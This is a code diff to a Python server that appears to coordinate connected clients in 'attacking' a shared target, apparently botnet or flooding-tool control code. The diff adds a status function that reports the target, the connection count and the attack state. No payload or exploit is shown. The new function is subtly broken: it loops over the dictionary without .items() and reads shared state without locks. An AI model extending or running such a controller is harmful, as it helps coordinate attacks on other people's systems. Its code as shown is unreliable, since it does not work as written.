@@ -7,7 +7,7 @@ from webserver import runServer
 active_connections_lock = threading.Lock()
 active_connections = 0
 conn_dict_lock = threading.Lock()
-conn_dict = {}  # key is the connection address, value is either "Idle" or "Attacking"
+conn_dict = {}  # key is the connection address, value is either "stopped" or "attacking"
 target = ""
 
 # event that can be used to tell all threads to stop running or attacking
@@ -79,6 +79,21 @@ def handle_client(conn: socket.socket, addr):
         print(active_connections, "connections left")
     with conn_dict_lock:
         del conn_dict[addr]
+
+
+def getAttackDetails():
+    conn_list = []
+    is_attacking = False
+    state = "Idle"
+    for key, val in conn_dict:
+        conn_list.append({key:val})
+    for key, val in conn_dict:
+        if val == "attacking":
+            is_attacking = True
+            break
+    if is_attacking:
+        state = "Attacking"
+    return {"target": target, "num_conns": active_connections, "conns": conn_list, "state": state}
 
 
 if __name__ == "__main__":
